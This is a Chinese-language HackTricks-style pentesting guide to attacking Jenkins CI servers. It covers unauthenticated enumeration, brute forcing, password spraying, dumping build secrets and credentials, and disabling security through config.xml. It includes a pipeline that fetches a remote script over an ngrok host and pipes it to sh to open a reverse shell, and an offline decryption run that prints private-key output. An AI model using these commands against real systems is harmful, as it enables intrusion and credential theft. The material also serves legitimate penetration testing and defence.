# Jenkins 安全性

<details>

<summary><strong>从零到英雄学习 AWS 黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 基本信息

Jenkins 是一个工具，它提供了一种简单的方法，用于为几乎**任何**组合的**编程语言**和源代码仓库使用管道建立**持续集成**或**持续交付**（CI/CD）环境。此外，它还自动化了各种常规开发任务。虽然 Jenkins 并没有消除为各个步骤**创建脚本的需求**，但它确实提供了一种比手动轻松构建的整个构建、测试和部署工具序列更快、更稳健的方式。


{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## 未经认证的枚举

为了搜索像（_/people_ 或 _/asynchPeople_，这列出了当前用户）这样的有趣 Jenkins 页面而无需认证，您可以使用：
```
msf> use auxiliary/scanner/http/jenkins_enum
```
检查是否可以在不需要认证的情况下执行命令：
```
msf> use auxiliary/scanner/http/jenkins_command
```
没有凭证，你可以查看 _**/asynchPeople/**_ 路径或 _**/securityRealm/user/admin/search/index?q=**_ 来找到**用户名**。

你可能能从 _**/oops**_ 或 _**/error**_ 路径获取 Jenkins 版本。

![](<../../.gitbook/assets/image (48).png>)

### 已知漏洞

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## 登录

在基本信息中，你可以检查**所有登录 Jenkins 的方式**：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 注册

你将能够找到允许你创建一个账户并登录的 Jenkins 实例。就这么简单。

### **SSO 登录**

如果存在**SSO** **功能**/**插件**，那么你应该尝试使用测试账户登录应用程序（例如，一个测试的 **Github/Bitbucket 账户**）。技巧来自[**这里**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)。

### 暴力破解

**Jenkins** 缺乏**密码策略**和**用户名暴力破解缓解措施**。对用户进行**暴力破解**是必要的，因为可能使用了**弱密码**或**用户名作为密码**，甚至是**反转的用户名作为密码**。
```
msf> use auxiliary/scanner/http/jenkins_login
```
### 密码喷涂

使用[这个Python脚本](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py)或[这个PowerShell脚本](https://github.com/chryzsh/JenkinsPasswordSpray)。

### IP白名单绕过

许多组织将**基于SaaS的源代码管理（SCM）系统**如GitHub或GitLab与**内部自托管CI**解决方案如Jenkins或TeamCity结合使用。这种设置允许CI系统**接收来自SaaS源代码控制供应商的webhook事件**，主要用于触发管道作业。

为了实现这一点，组织会**白名单** **SCM平台的IP范围**，允许它们通过**webhooks**访问**内部CI系统**。然而，重要的是要注意**任何人**都可以在GitHub或GitLab上创建一个**账户**并配置它来**触发webhook**，可能向**内部CI系统**发送请求。

检查：
[shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## 内部Jenkins滥用

在这些场景中，我们假设你有一个有效的账户来访问Jenkins。

{% hint style="warning" %}
根据在Jenkins中配置的**授权**机制和受损用户的权限，你**可能能够也可能不能执行以下攻击。**
{% endhint %}

更多信息请查看基础信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 列出用户

如果你已经访问了Jenkins，你可以在[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)列出其他注册用户。

### 转储构建以查找明文秘密

使用[这个脚本](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)转储构建控制台输出和构建环境变量，希望能找到明文秘密。
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **窃取SSH凭据**

如果被攻陷的用户有**足够的权限创建/修改新的Jenkins节点**，并且已经存储了SSH凭据以访问其他节点，他可以通过创建/修改节点并**设置一个将记录凭据的主机**来**窃取这些凭据**，而无需验证主机密钥：

![](<../../.gitbook/assets/image (56).png>)

您通常会在**全局提供者**（`/credentials/`）中找到Jenkins ssh凭据，因此您也可以像转储任何其他秘密一样转储它们。更多信息请参见[**转储秘密部分**](./#dumping-secrets)。

### **在Jenkins中执行RCE**

在Jenkins服务器上获取**shell**，给攻击者机会泄露所有的**秘密**和**环境变量**，并**利用同一网络中的其他机器**，甚至**收集云凭据**。

默认情况下，Jenkins将**以SYSTEM身份运行**。因此，攻陷它将给攻击者**SYSTEM权限**。

### **创建/修改项目执行RCE**

创建/修改项目是获取Jenkins服务器RCE的一种方式：

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **执行Groovy脚本执行RCE**

您还可以通过执行Groovy脚本获得RCE，这可能比创建新项目更隐蔽：

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### 创建/修改Pipeline执行RCE

您还可以通过**创建/修改pipeline**来获取**RCE**：

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pipeline利用

要利用pipelines，您仍然需要访问Jenkins。

### 构建Pipelines

**Pipelines**也可以用作**项目中的构建机制**，在这种情况下，可以配置**存储在仓库内的文件**，其中包含pipeline语法。默认使用`/Jenkinsfile`：

![](<../../.gitbook/assets/image (14) (1) (1).png>)

也可以**将pipeline配置文件存储在其他地方**（例如在其他仓库中），目的是**分离**仓库**访问**和pipeline访问。

如果攻击者有**对该文件的写权限**，他将能够**修改**它，并且**可能触发**pipeline，甚至无需访问Jenkins。\
攻击者可能需要**绕过一些分支保护**（根据平台和用户权限，它们可能被绕过或不被绕过）。

执行自定义pipeline的最常见触发器是：

* **向主分支发起Pull request**（或潜在地向其他分支）
* **向主分支推送**（或潜在地向其他分支）
* **更新主分支**并等待它以某种方式执行

{% hint style="info" %}
如果您是**外部用户**，您不应该期望能够对**其他用户/组织**的仓库的**主分支创建PR**并**触发pipeline**...但如果配置**不当**，您可能完全通过利用这一点**危及公司**。
{% endhint %}

### Pipeline RCE

在前面的RCE部分已经指出了一种[**修改pipeline获取RCE**](./#rce-creating-modifying-pipeline)的技术。

### 检查环境变量

可以为整个pipeline或特定阶段声明**明文环境变量**。这些环境变量**不应包含敏感信息**，但攻击者总是可以**检查所有pipeline**配置/Jenkinsfiles：
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### 导出秘密

要了解Jenkins通常如何处理秘密，请查看基本信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

凭据可以**限定在全局提供者**（`/credentials/`）或**特定项目**（`/job/<project-name>/configure`）。因此，为了窃取所有凭据，你需要**至少侵入包含秘密的所有项目**并执行自定义/恶意流水线。

还有一个问题，为了在流水线的环境变量中获取**秘密**，你需要**知道秘密的名称和类型**。例如，如果你尝试将**`usernamePassword`**类型的**秘密**当作**`string`**类型的**秘密**来**加载**，你会得到以下**错误**：
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
```markdown
以下是加载一些常见秘密类型的方法：
```
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
在本页末尾，您可以**找到所有凭证类型**：[https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**一次性导出所有秘密**的最佳方式是通过**攻破** **Jenkins** 机器（例如在**内置节点**上运行反向 shell），然后**泄露** **主密钥**和**加密的秘密**，并离线解密它们。\
更多关于如何做到这一点的信息，请参见[节点与代理部分](./#nodes-and-agents)和[渗透后部分](./#post-exploitation)。
{% endhint %}

### 触发器

来自[文档](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)：`triggers` 指令定义了**自动重新触发 Pipeline 的方式**。对于与源代码仓库如 GitHub 或 BitBucket 集成的 Pipelines，可能不需要 `triggers`，因为基于 webhooks 的集成很可能已经存在。目前可用的触发器有 `cron`、`pollSCM` 和 `upstream`。

Cron 示例：
```bash
triggers { cron('H */4 * * 1-5') }
```
查看**文档中的其他示例**。

### 节点与代理

一个**Jenkins实例**可能会在**不同的机器上运行不同的代理**。从攻击者的角度来看，访问不同的机器意味着**不同潜在的云凭证**可以被窃取，或者**不同的网络访问**可能被滥用来攻击其他机器。

更多信息请查看基础信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

你可以在`/computer/`中枚举**配置的节点**，你通常会找到**`内置节点`**（运行Jenkins的节点），可能还有更多：

![](<../../.gitbook/assets/image (25).png>)

**攻破内置节点尤其有趣**，因为它包含敏感的Jenkins信息。

如果你想在**内置的Jenkins节点**上**运行** **流水线**，你可以在流水线中指定以下配置：
```bash
pipeline {
agent {label 'built-in'}
```
### 完整示例

在特定代理中的 Pipeline，带有 cron 触发器，具有 pipeline 和 stage 环境变量，在步骤中加载 2 个变量并发送反向 shell：
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## 后渗透

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins 密钥

如果您拥有足够的权限，可以通过访问 `/credentials/` 来列出密钥。请注意，这只会列出 `credentials.xml` 文件中的密钥，但**构建配置文件**中可能还有**更多的凭证**。

如果您能够**查看每个项目的配置**，您还可以在那里看到正在使用的**凭证（密钥）的名称**，以及**项目的其他凭证**。

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

#### 通过 Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### 从磁盘

需要以下文件来**解密 Jenkins 密钥**：

* secrets/master.key
* secrets/hudson.util.Secret

这些**密钥通常可以在以下位置找到**：

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

以下是一个用于查找它们的正则表达式：
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### 离线解密Jenkins秘密

如果您已经转储了**解密秘密所需的密码**，使用[**这个脚本**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) **来解密这些秘密**。
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### 解密 Groovy 中的 Jenkins 密码
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### 创建新的管理员用户

1. 访问Jenkins的config.xml文件，路径为`/var/lib/jenkins/config.xml`或`C:\Program Files (x86)\Jenkis\`
2. 搜索`<useSecurity>true</useSecurity>`并将`true`改为`false`。
3. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
4. **重启** **Jenkins**服务器：`service jenkins restart`
5. 再次访问Jenkins门户，这次**Jenkins不会要求任何凭证**。你可以导航到“**管理Jenkins**”重新设置**管理员密码**。
6. 通过将设置改回`<useSecurity>true</useSecurity>`**再次启用** **安全性**，并**重启Jenkins**。

## 参考资料

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks**中看到你的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享你的黑客技巧**。

</details>
